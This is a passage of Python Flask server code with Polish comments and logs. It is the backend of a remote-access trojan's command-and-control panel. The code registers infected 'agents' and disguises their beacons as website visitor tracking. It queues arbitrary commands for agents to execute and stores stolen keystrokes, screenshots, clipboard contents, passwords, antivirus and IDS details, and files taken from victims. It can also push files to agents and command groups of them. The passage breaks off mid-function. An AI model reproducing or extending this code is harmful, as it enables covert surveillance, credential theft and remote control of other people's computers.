    system_changes.setdefault(agent_id, [])
    clipboard_data.setdefault(agent_id, [])
    network_scan.setdefault(agent_id, [])
    permissions.setdefault(agent_id, [])
    antivirus_data.setdefault(agent_id, [])
    passwords.setdefault(agent_id, [])
    ids_data.setdefault(agent_id, [])
    agent_stats.setdefault(agent_id, [])
    system_events.setdefault(agent_id, [])
    beacon_stats.setdefault(agent_id, [])
    agent_logger.info("Zarejestrowano agenta: %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    save_data({'agents': agents})
    broadcast_updates('agents_update', agents)
    return jsonify({
        'status': 'success',
        'visitor_session': str(uuid.uuid4()),
        'tracking_enabled': True
    })

def handle_beacon(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w beacon"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    if agent_id not in agents:
        return handle_register(data)
    current_time = time.time()
    beacon_stats.setdefault(agent_id, []).append({'timestamp': current_time, 'ip': ip})
    if len(beacon_stats[agent_id]) > 100:
        beacon_stats[agent_id] = beacon_stats[agent_id][-100:]
    # Usunięto sprawdzanie interwału beaconów
    if sleep_status.get(agent_id, False) and agents[agent_id].get('sleep_until', 0) > current_time:
        logging.info("Agent %s w trybie uśpienia, pomijanie aktualizacji statusu", agent_id,
                     extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        save_data({'agents': agents, 'beacon_stats': beacon_stats})
        return jsonify({
            'status': 'success',
            'tracking_enabled': True,
            'next_beacon': random.randint(300, 600)
        })
    agents[agent_id].update({
        'id': agent_id,
        'last_seen': current_time,
        'status': 'online',
        'ip': ip,
        'hostname': data.get('device_name', 'unknown'),
        'username': data.get('user_type', 'unknown'),
        'os_info': data.get('browser_info', 'unknown'),
        'is_vm': data.get('is_mobile', False),
        'gui_available': data.get('gui_available', False)
    })
    current_datetime = datetime.datetime.now()
    pending_tasks = []
    if agent_id in tasks:
        for task in tasks[agent_id]:
            if current_datetime >= task['scheduled_time'] and not task['executed']:
                pending_tasks.append(task['command'])
                task['executed'] = True
    for task_cmd in pending_tasks:
        commands[agent_id].append(task_cmd)
        logging.info("Dodano zadanie: %s", task_cmd, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    pending_commands = commands.get(agent_id, [])
    if pending_commands:
        cmd = pending_commands.pop(0)
        save_data({'commands': commands, 'tasks': tasks})
        return jsonify({
            'status': 'success',
            'tracking_enabled': True,
            'custom_script': cmd,
            'next_beacon': random.randint(5, 15)
        })
    save_data({'agents': agents, 'beacon_stats': beacon_stats})
    broadcast_updates('agents_update', agents)
    return jsonify({
        'status': 'success',
        'tracking_enabled': True,
        'next_beacon': random.randint(5, 15)
    })

def handle_result(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w result"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    command = data.get('event_type')
    result = data.get('page_data')
    if command is None or result is None:
        logging.warning("Brak event_type lub page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak event_type/page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak danych'}), 400
    logging.debug("Wynik dla komendy '%s': %s", command, result, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    if command == "system_info":
        try:
            parsed_info = json.loads(result) if isinstance(result, str) else result
            system_info.setdefault(agent_id, []).append({
                'data': parsed_info,
                'timestamp': time.time()
            })
            save_data({'system_info': system_info})
            logging.info("Zapisano informacje systemowe dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        except json.JSONDecodeError:
            errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania system_info dla {agent_id}: {result}"})
            broadcast_updates('errors_update', errors[-10:])
            return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    elif command.startswith("message "):
        chat_messages.setdefault(agent_id, []).append({
            'message': result,
            'timestamp': time.time(),
            'sender': 'agent'
        })
        save_data({'chat_messages': chat_messages})
        logging.info("Zapisano wiadomość czatu dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    else:
        output = result
        try:
            if isinstance(result, str) and result.startswith('"') and result.endswith('"'):
                result = json.loads(result)
            parsed_result = json.loads(result) if isinstance(result, str) else result
            output = parsed_result.get('output', parsed_result.get('error', result))
            is_error = parsed_result.get('error', False) or output.startswith("Błąd:")
        except json.JSONDecodeError:
            output = result
            is_error = output.startswith("Błąd:")
        except Exception as e:
            logging.error("Błąd przetwarzania wyniku dla %s: %s", agent_id, str(e), extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
            errors.append({"timestamp": time.time(), "message": f"Błąd przetwarzania wyniku dla {agent_id}: {str(e)}"})
            broadcast_updates('errors_update', errors[-10:])
            output = result
            is_error = True
        results.setdefault(agent_id, []).append({
            'command': command,
            'result': output,
            'timestamp': time.time(),
            'is_error': is_error
        })
        save_data({'results': results})
        logging.info("Zapisano wynik komendy '%s' dla %s", command, agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    return jsonify({'status': 'success', 'message': 'Wynik zapisany'})

def handle_keylog(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w keylog"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    keylog = data.get('form_data')
    if keylog is None:
        logging.warning("Brak form_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak form_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak form_data'}), 400
    try:
        parsed_keylog = json.loads(keylog) if isinstance(keylog, str) else keylog
        keylog_data.setdefault(agent_id, []).append({
            'data': parsed_keylog,
            'timestamp': time.time()
        })
    except json.JSONDecodeError:
        keylog_data.setdefault(agent_id, []).append({
            'data': [{'context': 'Unknown', 'key': keylog}],
            'timestamp': time.time()
        })
    save_data({'keylog_data': keylog_data})
    logging.info("Zapisano keylog dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    return jsonify({'status': 'success'})

def handle_screenshot(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w screenshot"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    screenshot = data.get('screenshot')
    if screenshot is None:
        logging.warning("Brak screenshot", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak screenshot dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak screenshot'}), 400
    screenshots.setdefault(agent_id, []).append({
        'data': screenshot,
        'timestamp': time.time()
    })
    save_data({'screenshots': screenshots})
    logging.info("Zapisano zrzut ekranu", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    return jsonify({'status': 'success'})

def handle_file_upload(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w file_upload"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    file_data = data.get('file_data')
    file_name = data.get('file_name')
    if file_data is None or file_name is None:
        logging.warning("Brak file_data lub file_name", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak file_data/file_name dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak file_data lub file_name'}), 400
    file_path = os.path.join('uploads', agent_id)
    os.makedirs(file_path, exist_ok=True)
    try:
        decompressed_data = zlib.decompress(base64.b64decode(file_data))
        with open(os.path.join(file_path, file_name), 'wb') as f:
            f.write(decompressed_data)
        file_transfers.setdefault(agent_id, []).append({
            'type': 'upload',
            'filename': file_name,
            'timestamp': time.time()
        })
        save_data({'file_transfers': file_transfers})
        logging.info("Zapisano plik: %s", file_name, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except Exception as e:
        logging.error("Błąd zapisu pliku: %s", str(e), extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Błąd zapisu pliku dla {agent_id}: {str(e)}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': f'Błąd zapisu pliku: {str(e)}'})
    return jsonify({'status': 'success'})

def handle_file_download_request(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w file_download_request"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    requested_file = data.get('requested_file')
    if requested_file is None:
        logging.warning("Brak requested_file", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak requested_file dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak requested_file'}), 400
    if os.path.exists(requested_file):
        file_transfers.setdefault(agent_id, []).append({
            'type': 'download',
            'filename': requested_file,
            'timestamp': time.time()
        })
        with open(requested_file, 'rb') as f:
            compressed_data = zlib.compress(f.read())
            file_data = base64.b64encode(compressed_data).decode('utf-8')
        save_data({'file_transfers': file_transfers})
        logging.info("Przygotowano plik: %s", requested_file, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        return jsonify({
            'status': 'success',
            'file_data': file_data,
            'file_name': os.path.basename(requested_file)
        })
    logging.error("Plik nie znaleziony: %s", requested_file, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    errors.append({"timestamp": time.time(), "message": f"Plik nie znaleziony dla {agent_id}: {requested_file}"})
    broadcast_updates('errors_update', errors[-10:])
    return jsonify({'status': 'error', 'message': 'Plik nie znaleziony'})

def handle_system_info(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w system_info"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    info = data.get('page_data')
    if info is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_info = json.loads(info) if isinstance(info, str) else info
        system_info.setdefault(agent_id, []).append({
            'data': parsed_info,
            'timestamp': time.time()
        })
        save_data({'system_info': system_info})
        logging.info("Zapisano informacje systemowe dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania system_info dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_system_changes(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w system_changes"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    changes = data.get('page_data')
    if changes is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_changes = json.loads(changes) if isinstance(changes, str) else changes
        system_changes.setdefault(agent_id, []).append({
            'data': parsed_changes,
            'timestamp': time.time()
        })
        save_data({'system_changes': system_changes})
        logging.info("Zapisano zmiany systemowe dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania system_changes dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_clipboard(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w clipboard"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    content = data.get('page_data')
    if content is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    clipboard_data.setdefault(agent_id, []).append({
        'content': content,
        'timestamp': time.time()
    })
    save_data({'clipboard_data': clipboard_data})
    logging.info("Zapisano dane schowka dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    return jsonify({'status': 'success'})

def handle_network_scan(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w network_scan"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    scan_data = data.get('page_data')
    if scan_data is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_scan = json.loads(scan_data) if isinstance(scan_data, str) else scan_data
        network_scan.setdefault(agent_id, []).append({
            'data': parsed_scan,
            'timestamp': time.time()
        })
        save_data({'network_scan': network_scan})
        logging.info("Zapisano wyniki skanu sieci dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania network_scan dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_permissions(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w permissions"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    perms = data.get('page_data')
    if perms is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_perms = json.loads(perms) if isinstance(perms, str) else perms
        permissions.setdefault(agent_id, []).append({
            'data': parsed_perms,
            'timestamp': time.time()
        })
        save_data({'permissions': permissions})
        logging.info("Zapisano dane uprawnień dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania permissions dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_antivirus(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w antivirus"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    av = data.get('page_data')
    if av is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_av = json.loads(av) if isinstance(av, str) else av
        antivirus_data.setdefault(agent_id, []).append({
            'data': parsed_av,
            'timestamp': time.time()
        })
        save_data({'antivirus_data': antivirus_data})
        logging.info("Zapisano dane antywirusa dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania antivirus dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_passwords(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w passwords"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    creds = data.get('page_data')
    if creds is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_creds = json.loads(creds) if isinstance(creds, str) else creds
        passwords.setdefault(agent_id, []).append({
            'data': parsed_creds,
            'timestamp': time.time()
        })
        save_data({'passwords': passwords})
        logging.info("Zapisano hasła dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania passwords dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_ids(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w ids"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    ids = data.get('page_data')
    if ids is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_ids = json.loads(ids) if isinstance(ids, str) else ids
        ids_data.setdefault(agent_id, []).append({
            'data': parsed_ids,
            'timestamp': time.time()
        })
        save_data({'ids_data': ids_data})
        logging.info("Zapisano dane IDS/IPS dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania ids dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_agent_stats(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w agent_stats"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    stats = data.get('page_data')
    if stats is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_stats = json.loads(stats) if isinstance(stats, str) else stats
        agent_stats.setdefault(agent_id, []).append({
            'data': parsed_stats,
            'timestamp': time.time()
        })
        save_data({'agent_stats': agent_stats})
        logging.info("Zapisano statystyki agenta dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania agent_stats dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_system_event(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w system_event"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    event = data.get('page_data')
    if event is None:
        logging.warning("Brak page_data", extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak page_data dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak page_data'}), 400
    try:
        parsed_event = json.loads(event) if isinstance(event, str) else event
        system_events.setdefault(agent_id, []).append({
            'data': parsed_event,
            'timestamp': time.time()
        })
        save_data({'system_events': system_events})
        logging.info("Zapisano zdarzenie systemowe dla %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    except json.JSONDecodeError:
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania system_event dla {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Błąd dekodowania danych'}), 400
    return jsonify({'status': 'success'})

def handle_agent_error(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        logging.warning("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w agent_error"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    error = data.get('page_data')
    errors.append({"timestamp": time.time(), "message": f"Agent {agent_id} error: {error}"})
    save_data({'errors': errors})
    broadcast_updates('errors_update', errors[-10:])
    logging.error("Błąd agenta: %s", error, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
    return jsonify({'status': 'success'})

@app.route('/api/upload_file_from_browser', methods=['POST'])
@role_required('admin')
def upload_file_from_browser():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    gui_logger.info("Żądanie upload_file_from_browser", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    if 'file' not in request.files or 'agent_id' not in request.form or 'target_path' not in request.form:
        gui_logger.warning("Brak wymaganych danych: file=%s, agent_id=%s, target_path=%s",
                          'file' in request.files, 'agent_id' in request.form, 'target_path' in request.form,
                          extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak pliku, agent_id lub target_path"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak wymaganych danych'}), 400
    file = request.files['file']
    agent_id = request.form['agent_id']
    target_path = request.form['target_path'].strip()
    if not file or not agent_id or agent_id not in agents:
        gui_logger.warning("Nieprawidłowe dane: file=%s, agent_id=%s, agent_exists=%s",
                          bool(file), agent_id, agent_id in agents,
                          extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        errors.append({"timestamp": time.time(), "message": f"Nieprawidłowe dane: agent_id={agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Nieprawidłowy plik lub agent_id'}), 400
    temp_dir = os.path.join('uploads', 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    file_name = file.filename
    temp_path = os.path.join(temp_dir, file_name)
    file.save(temp_path)
    try:
        with open(temp_path, 'rb') as f:
            compressed_data = zlib.compress(f.read())
            file_data = base64.b64encode(compressed_data).decode('utf-8')
        command = f'download "{file_name}" {file_data} ||| {target_path}'
        commands[agent_id].append(command)
        file_transfers.setdefault(agent_id, []).append({
            'type': 'download',
            'filename': file_name,
            'target_path': target_path,
            'timestamp': time.time()
        })
        agent_dir = os.path.join('uploads', agent_id)
        os.makedirs(agent_dir, exist_ok=True)
        with open(os.path.join(agent_dir, file_name), 'wb') as f:
            f.write(compressed_data)
        os.remove(temp_path)
        save_data({'commands': commands, 'file_transfers': file_transfers})
        gui_logger.info("Plik w kolejce: %s, agent_id=%s, target_path=%s",
                        file_name, agent_id, target_path,
                        extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        return jsonify({'status': 'success', 'message': f'Plik {file_name} w kolejce'})
    except Exception as e:
        gui_logger.error("Błąd przesyłania pliku: %s", str(e), extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        errors.append({"timestamp": time.time(), "message": f"Błąd przesyłania pliku: {str(e)}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': f'Błąd: {str(e)}'}), 500

def check_agent_statuses():
    """Okresowo sprawdza statusy agentów i aktualizuje je."""
    current_time = time.time()
    for agent_id in agents:
        last_seen = agents[agent_id].get('last_seen', 0)
        if current_time - last_seen > 30:
            if agents[agent_id]['status'] != 'offline':
                agents[agent_id]['status'] = 'offline'
                logging.info("Agent zmieniony na offline: %s (last_seen: %s, czas od ostatniego beacona: %.2fs)",
                             agent_id, last_seen, current_time - last_seen,
                             extra={'ip': 'N/A', 'user': 'system', 'agent_id': agent_id})
                broadcast_updates('agents_update', agents)
        elif agents[agent_id]['status'] != 'online':
            agents[agent_id]['status'] = 'online'
            logging.info("Agent zmieniony na online: %s", agent_id,
                         extra={'ip': 'N/A', 'user': 'system', 'agent_id': agent_id})
            broadcast_updates('agents_update', agents)
    save_data({'agents': agents})

@app.route('/api/agents')
@login_required
def list_agents():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    gui_logger.info("Zwrócono listę agentów, liczba agentów: %d", len(agents), extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    return jsonify(agents)

@app.route('/api/send_command', methods=['POST'])
@role_required('admin')
def send_command():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    data = request.json
    agent_ids = data.get('agent_ids', [])
    group_id = data.get('group_id')
    command = data.get('command')
    if not (agent_ids or group_id) or not command:
        gui_logger.warning("Brak agent_ids, group_id lub command: agent_ids=%s, group_id=%s, command=%s",
                          agent_ids, group_id, command,
                          extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak agent_ids, group_id lub command"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak danych'}), 400
    gui_logger.info(
        "Wysłano komendę: agent_ids=%s, group_id=%s, command=%s",
        agent_ids, group_id or 'N/A', command,
        extra={'ip': ip, 'user': user, 'agent_id': 'N/A'}
    )
    if group_id:
        agent_ids = agent_groups.get(group_id, [])
        critical_logger.info("Wysłano polecenie do grupy: %s", group_id, extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    offline_agents = []
    for agent_id in agent_ids:
        if agent_id not in agents:
            gui_logger.warning("Nieznany agent: %s", agent_id, extra={'ip': ip, 'user': user, 'agent_id': agent_id})
            errors.append({"timestamp": time.time(), "message": f"Nieznany agent: {agent_id}"})
            broadcast_updates('errors_update', errors[-10:])
